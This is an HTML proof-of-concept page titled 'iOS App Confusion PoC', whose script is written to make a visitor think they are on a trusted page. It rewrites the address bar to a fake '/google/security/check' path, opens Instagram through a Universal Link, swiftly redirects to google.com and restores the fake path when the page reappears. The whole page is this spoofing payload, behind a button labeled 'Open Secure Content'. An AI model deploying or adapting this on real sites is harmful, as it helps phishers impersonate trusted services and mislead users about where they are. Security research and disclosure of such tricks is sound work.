<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>iOS App Confusion PoC</title>
<meta name="viewport" content="width=device-width,initial-scale=1">

<style>
body {
  font-family: -apple-system, BlinkMacSystemFont, sans-serif;
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}
button {
  padding: 16px 28px;
  font-size: 16px;
}
</style>
</head>

<body>

<button id="start">Open Secure Content</button>

<script>
document.getElementById('start').onclick = () => {

  /* Step 1: Fake trusted-looking path */
  history.pushState({}, '', '/google/security/check');

  /* Step 2: Open app via Universal Link (Instagram as example) */
  location.href = 'https://www.instagram.com/instagram/';

  /* Step 3: Quickly navigate to trusted site */
  setTimeout(() => {
    location.replace('https://www.google.com');
  }, 120);
};

/* Step 4: When page is shown again (return from app) */
window.addEventListener('pageshow', () => {
  history.replaceState({}, '', '/google/security/check');
});
</script>

</body>
</html>
